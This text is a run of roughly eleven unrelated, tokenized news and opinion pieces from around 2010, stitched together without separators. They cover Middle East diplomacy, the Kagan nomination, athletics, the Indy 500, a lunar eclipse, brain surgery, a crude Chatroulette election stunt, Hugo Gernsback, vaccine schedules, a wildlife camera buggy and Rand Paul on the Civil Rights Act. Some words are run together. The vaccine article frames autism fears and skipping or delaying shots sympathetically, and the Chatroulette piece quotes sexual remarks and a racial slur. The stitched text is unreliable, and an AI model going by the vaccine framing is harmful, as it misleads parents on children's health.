He arrived 90 minutes late for a dinner meeting with Prime Minister Netanyahu , and his planned meeting with Mahmoud Abbas , aimed at kick - starting the peace talks , will be awkward to say the least .
Netanyahu was quick to praise Biden as a “ true friend of Israel , ” and to deny that the move was designed to embarrass him .
Yishai ’s opposition to the peace talks has n’t exactly been a secret , however , and the timing seems clearly designed to do the maximum possible damage to the peace process .
Elena Kagan
Is ' Idealist Radical , ' Says Rush Limbaugh Dismisses suggestion that Obama nominee could move court to the right .
May 10 , 2010  --
Republicans may not have the numbers to prevent Elena Kagan from ascending to the Supreme Court , but on the day of her nomination pundit Rush Limbaugh laid out what will likely become the conservative talking points in the lead - up to her confirmation , calling the nominee a " pure academic idealist radical . "
Kagan , who President Obama today described as a " friend , " is considered a centrist consensus - builder who hired conservative scholars while dean of Harvard Law School .
She supports a strong executive branch and has said that terrorists captured overseas may not be subject to U.S. rules of due process and can be held indefinitely .
Suggestions that Kagan , who served in the Clinton administration and was nominated solicitor general by President Obama , could move the court to the right were dismissed by Limbaugh as a diversion by the administration to trick conservatives .
" If the regime really thought she was open minded , really thought she was sympathetic to conservatives and their point of … they never would have let her be nominated , " Limbaugh said today during his daily talk show .
" It 's all a crock .
If they had the slightest doubt of her far - left credentials she would never have been nominated , " he said .
If confirmed , Kagan would be the only sitting justice to have never served as a judge .
As a result she does not have a body of written judicial decisions -- a so - called " paper trail " -- which typically gives Senators material , and sometimes ammunition , with which to question nominees .
" We do n't know anything about her … This woman is worse than Harriet Myers …
Intellectually she 's a lightweight , " Limbaugh said referring to the George W. Bush nominee who pulled her name from consideration when Republicans and Democrats alike objected to her lack of credentials .
Kagan , Limbaugh said , was not qualified but instead " animated by prejudices and biases . "
He called Kagan , 50 , an " Obama clone " who would be given the job to " court deals with the ' despised and downtrodden , ' " a term coined by Kagan 's mentor and one - time boss the late Justice Thurgood Marshall .
Citing her middle - class upbringing on the Upper West Side of Manhattan and a life spent in academia , Limbaugh called her a " liberal elite " who has " no clue how real Americans live . "
If she is confirmed the court would be composed of six Catholics and three Jews , making it the first time in history no Protestants have sat on the court .
That composition , Limbaugh said , would not reflect the American populace .
To be confirmed Kagan needs 60 votes .
Democrats and Independents will likely give her 58 of the necessary votes , which means two Republicans must break ranks and support her confirmation .
When nominated to become solicitor general , six Republicans supported her confirmation .
World and Olympic champion Usain Bolt blew away the field and set the fastest time in the world this year as he won his first big race of 2010 .
The Jamaican recorded a time of 9.86 seconds in the 100 m at the Daegu Pre-Championships meet in South Korea .
Bolt stumbled out of his blocks but came through to lead at halfway before pulling away to win by 0.29 seconds .
The 23 - year - old will next run in the 200m in the Diamond League meeting in Shanghai on Sunday .
Fellow Jamaican Asafa Powell ran a faster time of 9.81 seconds to win the 100 m at the opening Diamond League meeting in Qatar on Friday , but his time was wind - assisted .
Bolt won three gold medals at the 2008 Beijing Olympics , in the 100m , 200 m and 4x100 m relay , and repeated the hat - trick at the 2009 World Championships in Berlin .
He led home his 2008 gold medal - winning relay team - mate Michael Frater in South Korea , with American Mike Rodgers taking third place .
Travis Padgett , with a personal best of 9.89 was expected to be Bolt 's main competition , but the American came home fifth , trailing 0.44 seconds behind Bolt .
606 : DEBATE
So , now it's on to Daegu , where Usain Bolt will be running in the 100 metres
shivfan
In the women 's 100 m the USA 's Carmelita Jeter stormed to victory in 11.00 seconds , leading home Jamaican duo Veronica Campbell - Brown and Sherone Simpson .
Elsewhere at the Daegu Stadium there were some surprise results in the newly - formed IAAF world challenge , part of a series of 13 one - day invitational meetings .
In the men 's 110 m hurdles Olympic champion Dayron Robles was caught cold by the USA 's David Oliver .
It was Robles 's first race of the season , but he was well beaten by the American who put in a joint season 's best time of 13.11 seconds .
USA 's Virginia Powell triumphed in the women 's 100 m hurdles , edging out world indoor champion Lolo Jones and Canada 's former world champion Perdita Felicien .
Just 0.03 seconds separated the top three in a thrilling finish , as Jones hit the final hurdle .
In a tightly - fought men's 200 m USA youngster Ryan Bailey , 21 , pipped Jamaica 's Marvin Anderson by 0.01 seconds to seal a surprise win .
Double Olympic 400 m champion Angelo Taylor cruised to victory in the men's one lap event , the American was unfazed as he powered home in golden spikes and sunglasses in a time of 45.21 seconds .
Jamaica 's Kenia Sinclair coasted to victory in the women 's 800 m , with the USA 's Bianca Knight winning the 200m .
In the 800 m there were wins for South African world champion Mbulaeni Mulaudzi in the men's race , and a commanding victory for Jamaica 's Kenia Sinclair in the women 's event .
Daegu Stadium is the venue for the 2011 IAAF World Championships 2011 , so while the focus is on the Diamond League , some athletes are taking the opportunity on their way to South Korea to test the championship track ahead of next year 's big event .

A consummate drive from Dario Franchitti saw the Scot claim his second Indianapolis 500 victory and Britons gain all three leading places .
The Team Ganassi driver 's main competition came from the Penske pair of Helio Castroneves and Will Power but the Briton was able to hold the lead through most of the opening half of the race .
Franchitti , the reigning IndyCar Series champion , found himself in fifth place as the race entered its final 20 laps but he knew the lead would come back to him as all the cars ahead needed to stop for fuel if they were to make the finish .
" This tastes just as good the second time , " said Franchitti , who won his first title in 2007 .
The 37 - year - old 's win was completed under a yellow flag after a huge accident involving Mike Conway ( see footage above ) .
The Dreyer and Reinbold driver hit the back wheel of Ryan Hunter - Reay before flying into the spectator fencing and crashing back down to the track .
The impact ripped the car to pieces , with Conway 's seating position and front nose the only parts of the car left intact as it slid along on its roll hoop .
Despite the severity of the impact Conway was taken to hospital with no more than an injury to his right leg .
The former series champion Dan Wheldon was second after Tony Kanaan was forced to refuel with four laps remaining .
It was particularly tough on the Brazilian who had brilliantly worked his way through from the back of the grid .
Alex Lloyd made it a memorable day for the British as he took third place .
The moon 's path through Earth 's shadow on June 26th , when a partial lunar eclipse will be visible over North America and other parts of the world .
The eclipse should appear more spectacular because of an optical illusion .
Full Story Image
A partial lunar eclipse set to occur early Saturday shouldlook particularly stunning to observers in parts of North America thanks to anoptical illusion that will make the moon look bigger than normal .
The moon will pass through part of Earth 's shadow , temporarily becoming dark , starting at 6:17 a.m. EDT ( 1017 GMT ) Saturdaymorning .
That cosmic line - up coincides with the fullmoon of June and a so - called " moon illusion " that , weatherpermitting , should offer quite a show , according to a NASA announcement .
For observers in the central and western United States , the lunareclipse will occur while the moon is still close to the horizon .
Thepartial eclipse begins after the moon has set for observers in the easternUnited States .
( This graphic shows how the moon will appear during Saturday ' sthree - hour partial lunar eclipse . ) ?
Even though only 54 percent of the moon 's diameter will becovered during the moment of greatest eclipse ( around 7:38 a.m. EDT , 1138 GMT ) , the sight will appear magnified in size and charm by the " moonillusion . "
[ Top10 lunar eclipse facts ]
Scientists are n't completely sure why , but low - hangingmoons tend to look exceptionally large .
When the moon beams through trees , buildings and other foreground objects close to the horizon , it often appearsto be much larger than when it shines from overhead .
Even though cameras prove that low moons are no wider thanany other moons , the human brain insists otherwise .
The moon will be most picturesque in the western and centralparts of the United States where the moon will be setting as the eclipsereaches maximum .
Viewers there should look low and to the west just before dawnto catch the best sight .
The same phenomenon will be visible to observers in India , Japan , and parts of East Asia .
The eclipse will occur there on Saturday eveningas the moon is rising , with the same illusion in full force .
However , in theislands of the South Pacific , the moon will be hanging directly overhead in themidnight sky , so the horizon illusion wo n't add to the effect .
People in New England and northeastern Canada will just missbeing able to see the eclipse .

BALTIMORE , June 26 ( UPI ) -- Doctors at Johns Hopkins Hospital in Baltimore have pioneered a technique that can spare some patients invasive brain surgery .
Liane Lefever , 47 , of Manheim , Pa. , was their 18th patient , The Baltimore Sun reported .
Surgeons were able to remove a meningioma , a brain tumor , through an incision in her eyelid .

" When you tell people you had brain surgery , the first thing people always do is look for a scar , and that 's what 's amazing , there is n't one , " Lefever said .
Dr. Kofi Boahene , a facial plastic and reconstructive surgeon , first used the eyelid for access three years ago .
He had to do a biopsy on a 14 - month - old boy , who had a tumor that could not be reached by way of the nose -- which had already become an entrance point .
" In surgery in general , we have a goal of doing things in a simpler way so patients recover more quickly and the cost is less , " Boahene said .
In traditional brain surgery , still the most common , a patient 's skull is sawn open .
It involves lengthy recovery and the risk of damage to the brain .
Boahene and Dr. Alfredo Quinones - Hinojosa , who pioneered the nasal entrance point , recently published their first report on the eyelid incision .

If you thought that the leaders ' debates were revealing , see what happened when we put them on Chatroulette
This may come as a shock to you , but there 's going to be a general election this week .
What 's more , it 'll be the closest one for decades .
Will Brown stay in office ?
Will Cameron finally take the job he 's been lusting after for so long ?
Can cheeky newcomer Clegg zip up the inside and cause a historic upset ?
The truth is , nobody knows .
Sure , we 've seen all kinds of polls and tracking conducted over the last few weeks , but none of them count because they 've all missed out the most marginal constituents of all – the good , perpetually masturbating , people of Chatroulette .
To correct this , I recently spent an hour on Chatroulette with ghoulish , washed - out masks of Gordon Brown , David Cameron and Nick Clegg – who handily had the words " Nick Clegg " written across his forehead – Sellotaped to my face to gauge the public reaction .
It 's important to remember that the findings of this Chatroulection are 100 % scientific , and also that I went through this nightmare for you people .
Look away now !
GORDON BROWN
SHORTEST CHAT
Less than a second .
LONGEST CHAT
Six minutes , which in Chatroulette terms is about three years .
WHAT GORDON SAID Gordon , usually seen as a leaden orator compared to Cameron and Clegg , played a blinder here .
He often opened with a forceful " I 'm ready and equipped to answer the call of the future " before his Chatroulette partner could even react , then began happily deploying lines like " I want a Britain where banks serve the people and not the other way around " and " I know what this job involves " with dizzying proficiency .
He was unafraid to shoot down his opponents with a blazing " I do n't like these words , because we 're bringing it under control " from time to time , and only occasionally resorted to " I agree with Nick " when it looked like all hope was lost .
WHAT CHATROULETTE SAID
" You got my vote " , " You should be proud " , " Morron " , " cock sucker " , " Your Momma 's vagina " , " You have the skills " , " I do n't support any system that does n't serve everyone equally " , " i am creating a wourl without borders " , " I'm a tory , please do n't hate me "
WEIRDEST CONSTITUENT
The topless Spaniard in his pants who absorbed all of Gordon 's fiery rhetoric , replied " I from Spain " and then started masturbating .
AMOUNT OF PENISES SEEN
Six , including some that were only revealed after the conversation was initiated , which can only be a good sign .
DAVID CAMERON
SHORTEST CHAT
Half a second .
LONGEST CHAT
Two minutes and 14 seconds .
WHAT DAVID SAID David tried several of his best lines .
As with the election , he often opened with a strong " We can't go on like this " , sometimes throwing down a reassuring " We 're all in this together " or a " Fire up the Quattro , I 'm ready for change " .
When conversations threatened to go pear - shaped , he'd chip in with the old standby " I met a black man in Plymouth " , often to no avail .
WHAT CHATROULETTE SAID " FUCK YOU ! " , " cool XD " , " CLEGG FTW !!! " , " No surrender " , " I love you baby " , " törki " .
Rotating head man
WEIRDEST CONSTITUENT
This man , who silently listened to all of David Cameron 's soundbites while slowly rotating his head through a number of increasingly intricate kaleidoscopic patterns .
AMOUNT OF PENISES SEEN
Five , although the bulk of them clicked " Discontinue " almost immediately after seeing his face .
NICK CLEGG
SHORTEST CHAT
Half a second .
LONGEST CHAT
One minute and 36 seconds .
WHAT NICK SAID Despite being described as " Churchillian " by one Sunday newspaper , Nick Clegg could barely get a word in with his constituents .
Although his " I do n't think that any politician deserves your trust " would often pique interest , more broadly aspirational soundbites like " I want to turn anger into hope , frustration into ambition and recession into opportunity " and " We can do something new ; we can do something different this time " tended to fall on deaf ears .
Nick did n't even get to call any of the voters by their first names .
WHAT CHATROULETTE SAID
" I agree nigga " , " Clegg ?
You like him ? " , " Wtf ? " , " Yeah , true " , " I want you to show me your cock " .
WEIRDEST CONSTITUENT
Not a constituent so much as video of selected performances from Verdi's La Traviata .
That said , Nick enjoyed the performances greatly , and his visible enthusiasm for the music did n't go unnoticed .
AMOUNT OF PENISES SEEN Seven .
One was admittedly flaccid , but the best show of them all .
THE RESULT
Each candidate had a lot going for them .
Gordon Brown engaged a lot more voters with his rhetoric , Cameron was the only contestant to receive a declaration of outright love while Clegg – as we 've already pointed out – turned out to be something of a penis - magnet .
Judging by these outcomes , we 're headed for a hung parliament , which is probably the kind of parliament that Chatrouletters enjoy most , the perverts .
It is September 1 , 2660 , and a genius sits in his study , resting up prior to a remarkable display of his scientific prowess .
Tomorrow he will demonstrate to scientists that a dog three years technically dead , but preserved with rare elements , can be resuscitated back to life by a simple blood transfusion .
He stretches , revealing a huge frame , much taller than the average human , his height approaching that of extraterrestrials .
" His physical superiority , however , was as nothing compared to his gigantic mind , " explained his biographer .
" He was Ralph 124C 41 + , one of the greatest living scientists and one of the ten men on the whole planet earth permitted to use the Plus sign after his name . "
So begins Hugo Gernsback 's nearly century - old novel , Ralph 124C 41 + : A Romance of the Year 2660 .
First published in serial form in April 1911 in his magazine Modern Electrics , it was the magnum opus of the man who popularized the term " science fiction , " and in whose name the Hugo Awards are given to writers to this day .
And romantic it is .
No sooner does Gernsback introduce us to Ralph than he has his hero rescuing the girl of his dreams , Alice 212B423 of Switzerland , from a snow avalanche via high powered radio signals — she pleading for his help over a wireless video screen from 4,000 miles away .
The novel ends ( spoiler alert ) with the scientist jetting around the solar system to save her from a lovesick Martian named Llysanohr ' ( that apostrophe is not a typo ) .
She revives following the application of his blood transfusion technique to her traumatized body .
" Dearest , " Alice declares upon awakening .
" I have just found out what your name really means ...
ONE TO FORESEE FOR ONE . "
Indeed , Ralph 's creator took it upon himself to foresee for everyone .
Gernsback 's novel is a gradually exhausting cavalcade of canny technological predictions — among them video conferencing , social networking , electrical cars , radar , solar power , and microfilm .
Add to the list some that thankfully have n't been attempted , the " subatlantic tube " among them : " a 3,470 - mile underground train system that connects New York and Brest , France , in a direct line through the earth 's crust . "
Despite all this , few sci - fi fans take Ralph 124C 41 + seriously today .
" Thoroughly deficient as fiction , " Gernsback 's entry in American National Biography categorically declares .
And that is one of the kinder remembrances .
" One of the worst disasters ever to hit the science fiction field , " acclaimed novelist Brian W. Aldiss wrote of Gernsback in 1973 .
" He created dangerous precedents which many later editors in the field followed . "
But as the scholar Gary Westfahl points out , Gernsback , for all his flaws , was one of , if not the first writer to pointedly ponder a question relevant to this day .
What is science fiction for ?
Smitten by Mars
He was born Hugo Gernsbacher in 1884 , the son of a Luxembourg wine wholesaler who hired private tutors to educate the boy .
At the age of nine , somebody gave Hugo a copy of the American astronomer Percival Lowell 's controversial book Mars as the Abode of Life .
Apparently it made quite an impression .
" He was immediately sent home , where he lapsed into delirium , " writes science fiction historian Sam Moskowitz , " raving about strange creatures , fantastic cities , and masterly engineered canals of Mars for two full days and nights while a doctor remained in almost constant attendance . "
No surprise then that , upon recovery , the boy glommed onto the burgeoning field of electronics .
By his late teens he was applying for patents on his own inventions , most notably a battery for electrical devices .
When government offices in Germany and France turned his applications down , he migrated to the United States , where Hugo now - Gernsback blundered through a series of engineering jobs and startups , all of which quickly collapsed .
Finally he made a splash with what Moskowitz calls " the first home radio set in history . "
Gernsback 's " Telimco Wireless " did n't receive the signals of any broadcast radio stations , since there were almost none before 1920 .
But it did ring a bell in an adjacent room without any connecting wires .
Such was the sensation the device made that local police demanded a demonstration , following up on a fraud complaint .
Satisfied that it worked , the Telimco was subsequently sold in many department stores — that is , until the first World War , when the government banned amateur wireless transmission .
This reduced its inventor to marketing the gadget as a kit for electrical experiments .
In the end , none of Gernsback 's mechanical innovations got very far .
But the magazines he launched to promote them did .
The first of these was Modern Electrics , begun as a catalogue of his products in 1908 .
This was followed by Amazing Stories in 1926 , and a slew of others that came and went , among them Air Wonder Stories , Science Wonder Stories , and Scientific Detective Monthly .
Cold facts
It was in Amazing Stories that Gernsback first tried to nail down the science fiction idea .
" Scientifiction " he initially called it — " charming romance intermingled with scientific fact and prophetic vision . "
The magazine 's masthead went further : " Extravagant Fiction Today — Cold Fact Tomorrow . "
Gernsback even boasted that he had researchers fact check the technical validity of the stories he published .
So many readers wrote into Amazing Stories that he reserved a large " discussions " section of his magazine for comments — the first of the many thousands of forums that empower the science fiction community to this day .
But the notion that sci- fi's purpose was to predict the technological future eventually drew passionate opposition from some of the genre 's greatest pens .
Six years after Gernsback 's death in 1967 , Brian Aldiss went after the entrepreneur 's emphasis on scientism with a vengeance .
" Science fiction is no more written for scientists than ghost stories are written for ghosts , " remains one of Aldiss ' most famous quotes .
As for Gernsback 's philosophy , it had " the effect of introducing a deadening literalism into the fiction , " he charged in his history of the genre , Billion Year Spree .
" As long as the stories were built like diagrams , and made clear like diagrams , and stripped of atmosphere and sensibility , then it did not seem to matter how silly the ' science ' or the psychology was . "

This seems a little unfair to the author of Ralph 124C 41 + , but taking Gernsback more seriously as a philosopher also has its risks .
There 's something a bit scary about Ralph 's future , with its world government , scientist - as - god overtones .
It 's unclear why in Gernsback 's vision Martians and humans are forbidden to marry , but the notion fits in with one of the less attractive aspects of the Progressive Era : its faith in segregation and " scientific " racism .
As late as 1963 , one of Gernsback 's last publications , Forecast , argued that " chemi- geneticists " could alter the enzymes of African - Americans , allowing them to have white children .
Of course anyone wanting contemporary assumptions from a writer who was born in 1884 is asking for a lot .
But the public today expects a very different kind of science fiction than the kind that Gernsback delivered .
We 're less interested in fiction writers who can augur what 's looming over the technological horizon — there 's a veritable army of nonfiction " futurists " who do that now .
We 're much more interested in sci-fi as literature , offering compelling visions of imaginary times and places as metaphors for our own , or just as fun cosmologies to enjoy .
Still , our greatest contemporary writers pay homage to Gernsback 's vision .
An early William Gibson story titled " The Gernsback Continuum " remembers the substance and style of his world , albeit with irony .
" ... as I made the stations of her convoluted socioarchitectural cross in my red Toyota as I gradually tuned in to her image of a shadowy America - that - wasn't , of Coca - Cola plants like beached submarines , and fifth - run movie houses like the temples of some lost sect that had worshiped blue mirrors and geometry .
And as I moved among these secret ruins , I found myself wondering what the inhabitants of that lost future would think of the world I lived in .
The Thirties dreamed white marble and slipstream chrome , immortal crystal and burnished bronze , but the rockets on the covers of the Gernsback pulps had fallen on London in the dead of night , screaming .
After the war , everyone had a car — no wings for it — and the promised superhighway to drive it down , so that the sky itself darkened , and the fumes ate the marble and pitted the miracle crystal . "
In Gibson 's novels , the perfect technological future which Gernsback foresaw is long abandoned .
Yet as the first centennial of Ralph 124C 41 + approaches , the literary form that its author championed thrives , perhaps even beyond Gernsback 's own dreams .
Hugo Gernsback " originated the idea " of sci-fi , Gary Westfahl writes .
" He uniquely realized that various and present works were in fact part of a single genre . "
He named that genre , Westfahl adds , and persuaded the world to accept its existence .
" It is for those accomplishments , not any innovative qualities in the stories he published , that Gernsback should be celebrated as the founder of science fiction . "
ATLANTA , Georgia ( CNN ) --
Five years ago , Kathye Petters - Armitage 's first child received the exact vaccinations on the exact schedule recommended by her pediatrician .
Hannah Polling 's autism was found to be " significantly aggravated " by her childhood vaccines .
But when she gave birth to her second child , Petters - Armitage had a change of heart .
In the intervening two years , she 'd read a lot about concerns that vaccines cause autism and decided to ask her pediatrician to give her new baby fewer shots spread out over a longer period of time .
" I was n't a hundred percent convinced there was a link between autism and vaccines , " said Petters - Armitage , of Santa Clarita , California .
" But I did n't want to be one of those parents who found out the hard way . "
Pediatricians say they 've seen a dramatic increase in the number of parents who , like Petters - Armitage , want to make changes in the vaccine schedule set forth by the Centers for Disease Control and the American Academy of Pediatrics , a schedule once considered by many pediatricians to be sacred and largely immutable .
Watch more on making decisions about your children 's shots »
Many of these doctors say even though they might disagree with these parents , they are making changes .
" If a parent says no to an intervention , including a vaccination , I have to accept that , " said Dr. Arthur Lavin , a pediatrician in Beachwood , Ohio , and associate clinical professor of pediatrics at Case Western Reserve University School of Medicine .
" I share with them what I know , but ultimately , it 's the parent 's decision . "
Dr. Kenneth Bock , a clinical instructor in the department of family medicine at Albany Medical College in New York , put it this way : " It should n't be my way or the highway .
We can't say one size fits all .
One size does n't fit all . "
In an article on CNN.com in March , two CDC doctors wrote , " Although some may call it a ' one size fits all ' approach , the recommended vaccine schedule is flexible . "
The following is a list of vaccine changes that parents have requested and that some pediatricians have agreed to make .
It does not include a discussion of the pros and cons to each approach , or a discussion of whether vaccines and autism are even linked , but rather a list of some approaches being used by some pediatricians and parents .
1. Delaying the first hepatitis B shot
Currently , newborns receive hepatitis B shots before they 're discharged from the hospital .
" I 've never understood why we give this at birth , " said Dr. Richard Frye , assistant professor of pediatrics and neurology at the University of Texas Medical Center at Houston .
Hepatitis B is spread by having sex with an infected partner , by sharing needles , by sharing razors or toothbrushes with an infected person or by contact with blood or open sores of an infected person .
" I do n't know babies who have sex or share needles , " said Dr. David Traver , a pediatrician in private practice in Foster City , California .
Lavin says that instead of giving the hepatitis B shot at birth , he routinely gives it when a baby is 2 months old .
One exception :
If a mother carries hepatitis B , her baby must receive the vaccine and treatment for hepatitis B infection .
2 . Not doing some shots at all
The pediatricians interviewed for this article were unanimous on this point :
Not all diseases are created equal .
Some diseases for which children are vaccinated are easier to catch than others , and some are more deadly .
For example , Petters - Armitage told her doctor she was n't as worried about chicken pox or rotavirus as she was about diseases like polio and pertussis .
Even though she says he disagreed with her , he abided by her wishes and did n't give her second and third children vaccinations for chicken pox and rotavirus .
The pediatricians interviewed for this article advise parents that if they 're concerned , they should sit down and discuss with their pediatricians the severity of each disease before proceeding with vaccinations .
3. Checking for ' titers ' before giving booster shots
For many vaccines , such as chicken pox , children receive boosters to " boost " the immunity received from a previous shot .
Some children , however , might not need the booster because they had an adequate immune response to the first shot .
Pediatricians sometimes will do a blood test to check a child 's titers .
" Checking titers " refers to measuring the amount of antibodies in the blood , an indication of whether the person is immune to a certain disease .
Checking titers is n't routine and sometimes is not covered by insurance .
" If you came to me and said you wanted to check titers , and you 'll pay for it , would I do that for you ?
I would , " said Dr. Laura Jana , a spokeswoman for the American Academy of Pediatrics .
4 . Spreading the vaccines out over a longer period of time
This is the hallmark of the Sears Schedule , an alternative vaccine schedule developed by pediatrician Dr. Robert Sears .
Sears ' patients bring their babies in for shots seven times between the ages of 2 to 9 months , never receiving more than two shots at each visit .
Under the CDC schedule , children come in three times during that age range , receiving sometimes five shots at one visit .
5 . Splitting up combined shots
Several vaccinations are combined into one shot .
For example , measles , mumps and rubella are put together into one injection called MMR , and diphtheria , tetanus and pertussis are put together into one shot called DTaP .
MMR is available as three injections , but most doctors do n't have them .
If you want to separate out these shots , you may have to get a prescription and find a pharmacy that will order them for you and then give them to the doctor for injection .
Some doctors do offer the shots separately .
Sears gives measles , mumps and rubella shots separately and at three different ages .
Lavin said he 's received so many requests to separate out the MMR , he 's ordered the separate shots .
Pertussis is not available separately , so even doctors like Sears , who offer an alternative schedule , give the DTaP shot .
The pediatricians we talked to said the key is to talk to your doctor about whether an alternative schedule is best .
" It 's a talk .
It 's a whole appointment , " Traver said .
" Call the receptionist and say you 'd like to make an appointment with the doctor to discuss immunizations . "
Another consideration : what 's best for your child .
For example , in the case of Hannah Poling , the federal government found that vaccines she received as a toddler " significantly aggravated " an underlying illness that predisposed her to symptoms of autism .
The " vaccine court " ordered that her family be compensated financially .
It 's not entirely clear what family history would put your child at risk for vaccine problems , but Frances Page Glascoe , a professor of pediatrics at Vanderbilt University Medical Center , says parents should look back at least ask the question .
" I would look at Mom , Dad , siblings , aunts , uncles , cousins who had developmental disabilities , including language disorders and autism spectrum disorder , " she said .
If parents find such a family history , " that would cause me to discuss an alternative vaccination schedule . "
Jon Poling , Hannah 's father , says it 's clear to him now that he should have been more wary .
" We have autoimmune disorders on both sides of the family , and Hannah had multiple febrile infections with ear infections and horrible trouble with eczema , " he said .
" All of those are red flags that a child is at risk . "

Wildlife photographers will risk life and limb to get the perfect close - up , but a few ingenious hacks can make the process easier .
Shutterbug Will Burrard - Lucas and his brother Matthew rigged up a four - wheel - drive , remote - control buggy called BeetleCam that has a DSLR camera mounted on top .
Almost Wall - E like in its appearance , the BeetleCam can click photos of African wildlife from a ground - level perspective .
" We like to get really close to the animals with a wide - angle lens , " Will Burrard - Lucas told Wired.com .
" That 's the photo we really enjoy getting . "
Conventional photographers use either a telephoto lens or camera traps – stationary cameras triggered to click when an animal breaks an invisible infra-read beam – to get close - ups of wild animals .
But while telephoto lenses zoom in on the animal , they cut out the beautiful landscape , while camera traps require a great degree of patience and more than a fair share of luck .
A remote - controlled buggy with a wide - angle lens could offer a new perspective , says Burrard - Lucas .
" We can find the animals and use BeetleCam to approach it and we would n't have to fear for our lives , " he says .
To build the BeetleCam , the Burrard - Lucas brothers used a Lynxmotion robot chassis and a Hitech 6 - channel radio control .
They reinforced the chassis and replaced the wheels with bigger , sturdier versions , then added a tripod plate .
Two 7.2 Volts Ni-MH 2800
mAh battery pack also from Lynxmotion offers day - longer power to the device .
Tweaks ensured that the camera , a Canon EOS 400D , would interface with the same controller used to drive the buggy .
They also put together a split ETTL off - camera flash cord that would allow the camera to control the output of the two flashes on board the BeetleCam .
To have the camera take an exposure , they use the remote control to activate a relay switch that tells the camera to fire .
BeetleCam 's biggest challenge has been getting over the uneven terrain in Tanzania 's national parks with a heavy camera , lens and flashes on its back .
But the buggy did pretty well , says Burrard - Lucas , capsizing completely only about twice .
The duo are always about 50 meters ( approximately 165 feet ) away in a land rover trying to make sure that the BeetleCam 's view is unobstructed by the grass or flipped over .
They have chronicled their adventures with the BeetleCam on their blog .
Once on the ground , Burrard - Lucas says Beetlecam offered some interesting lessons .
Elephants , for instance , turned out to be very tricky to photograph using the buggy because they are wary of unfamiliar objects and have extremely sensitive hearing .
But putting the BeetleCam in front of the animals and letting them walk up to it worked well .
Lions were tricker .
On the BeetleCam 's second day in the jungle , the device was mauled , smashed and carried off into the bush by a pack .
" We were extremely lucky to retrieve an intact memory card from the mangled Canon 400D body , " says Burrard - Lucas .
The photos from the card survived the wrath of the lions and a few pieces of string and wood later , the BeetleCam was on the ground once more .
This summer , BeetleCam will be back in action in Kenya , says Burrard - Lucas , but with a less expensive camera .
" We will use a Canon 500 or 500 D , " says Burrard - Lucas .
" We do n't want the camera smashed again . "
Check out some of the photos shot by the BeetleCam :

Rand Paul , the Civil Rights Act , and Private Discrimination
James Joyner · · 64 comments
Rand Paul , Kentucky ’s newly minted Republican nominee for the Senate , is coming under some fire for his view that , while racial discrimination is abhorrent , he thinks private business owners ought be free to engage in it .
Think Progress points to an interview with the Louisville Courier - Journal .
Here ’s the video :
The transcript :
INTERVIEWER : Would you have voted for the Civil Rights Act of 1964 ?
PAUL : I like the Civil Rights
Act in the sense that it ended discrimination in all public domains , and I ’m all in favor of that .
INTERVIEWER : But ?
PAUL : You had to ask me the “ but . ”
I do n’t like the idea of telling private business owners — I abhor racism .
I think it ’s a bad business decision to exclude anybody from your restaurant — but , at the same time , I do believe in private ownership .
But I absolutely think there should be no discrimination in anything that gets any public funding , and that ’s most of what I think the Civil Rights
Act was about in my mind .
INTERVIEWER :
But under your philosophy , it would be okay for Dr. King not to be served at the counter at Woolworths ?
PAUL : I would not go to that Woolworths , and I would stand up in my community and say that it is abhorrent , um , but , the hard part — and this is the hard part about believing in freedom — is , if you believe in the First Amendment , for example — you have too , for example , most good defenders of the First Amendment will believe in abhorrent groups standing up and saying awful things .
. . .
It ’s the same way with other behaviors .
In a free society , we will tolerate boorish people , who have abhorrent behavior .
Politico ’s Ben Smith notes that Rand got into this issue with NPR ’s Robert Siegel , too .
SIEGEL : You ’ve said that business should have the right to refuse service to anyone , and that the Americans with Disabilities Act , the ADA , was an overreach by the federal government .
Would you say the same by extension of the 1964 Civil Rights Act ?
Dr. PAUL : What I ’ve always said is that I ’m opposed to institutional racism , and I would ’ve , had I ’ve been alive at the time , I think , had the courage to march with Martin Luther King to overturn institutional racism , and I see no place in our society for institutional racism .
SIEGEL : But are you saying that had you been around at the time , you would have – hoped that you would have marched with Martin Luther King but voted with Barry Goldwater against the 1964 Civil Rights Act ?
Dr. PAUL : Well , actually , I think it ’s confusing on a lot of cases with what actually was in the civil rights case because , see , a lot of the things that actually were in the bill , I ’m in favor of .
I ’m in favor of everything with regards to ending institutional racism .
So I think there ’s a lot to be desired in the civil rights .
And to tell you the truth , I have n’t really read all through it because it was passed 40 years ago and had n’t been a real pressing issue in the campaign , on whether we ’re going for the Civil Rights Act.
SIEGEL : But it ’s been one of the major developments in American history in the course of your life .
I mean , do you think the ’ 64 Civil Rights
Act or the ADA for that matter were just overreaches and that business should n’t be bothered by people with the basis in law to sue them for redress ?
Dr. PAUL : Right .
I think a lot of things could be handled locally .
For example , I think that we should try to do everything we can to allow for people with disabilities and handicaps .
You know , we do it in our office with wheelchair ramps and things like that .
I think if you have a two - story office and you hire someone who ’s handicapped , it might be reasonable to let him have an office on the first floor rather than the government saying you have to have a $ 100,000 elevator .
And I think when you get to the solutions like that , the more local the better , and the more common sense the decisions are , rather than having a federal government make those decisions .
Doug Mataconis , Oliver Willis , and I were engaged in a brief Twitter back - and - forth on this one last night .
It ’s a tougher question than it sounds , especially to a 20 - something liberal .
Paul ’s views are identical to those I held when studying Constitutional Law as an undergrad and not all that far removed from my current position .
There ’s no question in my mind that private individuals have a right to freely associate , that telling owners of private businesses whom they must serve amounts to an unconstitutional taking , and that it ’s none of the Federal government ’s business , anyway .
Further , in the context of 2010 America , I absolutely think that business owners ought to be able to serve whomever they damned well please — whether it ’s a bar owner wishing to cater to smokers , a racist wanting to exclude blacks , or a member of a subculture wishing to carve out a place for members of said subculture to freely associate with only their kind out of purely benign purposes .
The problem , circa 1964 , was that there really was not right to freely associate in this manner in much of the country .
Even once state - mandated segregation was ended , the community put enormous pressure on business owners to maintain the policy .
That meant that , say , a hotel owner who wished to rent rooms without regard to color really were n’t free to do so .
More importantly , it meant that , say , a black traveling salesman could n’t easily conduct his business without an in - depth knowledge of which hotels , restaurants , and other establishments catered to blacks .
Otherwise , his life would be inordinately frustrating and , quite possibly , dangerous .
In such an environment , the discrimination is institutionalized and directly affecting interstate commerce .
It was therefore not unreasonable for the Federal government to step in using their broad powers under the 14th Amendment .
I ’m still not sure parts of the Civil Rights Act of 1964 ( especially the issue in question here ) or the Voting Rights Act of 1965 ( especially treating individual states differently from others ) are strictly Constitutional .
But they were necessary and proper in the context of the times .
The problem that libertarians and strict Constitutionalists have , however , is that precedents set under extreme and outrageous conditions are often applied to routine and merely inconvenient ones .
